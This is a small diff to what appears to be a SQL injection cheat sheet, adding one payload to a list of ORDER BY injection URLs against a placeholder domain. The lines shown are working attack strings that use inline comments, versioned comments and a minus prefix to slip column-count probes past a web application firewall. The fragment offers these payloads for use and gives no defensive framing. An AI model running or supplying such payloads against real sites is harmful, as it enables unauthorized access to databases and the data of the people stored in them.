@@ -82,6 +82,7 @@ This query musn't shows up error, since there is no lower number than 1
 ```http://domain.com/index.php?id=1' /*!50000ORDER BY*/ 1-- -```  
 ```http://domain.com/index.php?id=1' order/**_**/by 1-- -```  
 ```http://domain.com/index.php?id=1\ order by 1-- -```  
+```http://domain.com/index.php?id=1' order by 1 asc-- -```  
     
     - If none of the payloads didn't bypass WAF, try again the payloads by following the 2 rules below:
       - Add a minus (-) before 1 (example: ```?id=-1' /**/ORDER/**/BY/**/ 1-- -```)  
